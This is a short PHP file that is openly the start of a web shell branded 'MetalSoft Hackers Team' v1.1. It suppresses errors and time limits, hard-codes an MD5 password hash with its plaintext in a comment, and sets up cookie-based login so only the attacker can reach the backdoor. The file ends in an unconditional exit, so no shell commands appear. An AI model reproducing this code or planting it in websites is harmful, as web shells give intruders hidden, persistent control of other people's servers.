<?php

// MetalSoftHackersTeam
// Jayalah Indonesiaku

error_reporting(0);
@set_time_limit(0); 


$s_name = "MetalSoft Hackers Team"; // Nombre de la shell
$s_ver = "1.1"; // Version de la shell
$s_title = $s_name." ".$s_ver; // Titulo de la shell
$s_pass = "d9ae3f29b7765b499485e924d3fe10e9"; // password (oficial passwd: metalsoft)

$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['MetalSoftTeam'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['MetalSoftTeam']))) 
			$s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$login = strtolower(trim($_REQUEST['login']));
		if(strtolower(trim($s_pass)) == md5($login)){
			setcookie("MetalSoftTeam",md5($login),time() + 3600*24*7);
			$m = $_SERVER['SCRIPT_NAME'];
			header("Location: ".$m);
			die();
		}
		else{
			setcookie("MetalSoftTeam",$login,time() - 3600*24*7);
			$m = $_SERVER['SCRIPT_NAME'];
			header("Location: ".$m);
			die();
		}
	}
}
else 
	$s_auth = true;

exit;
?>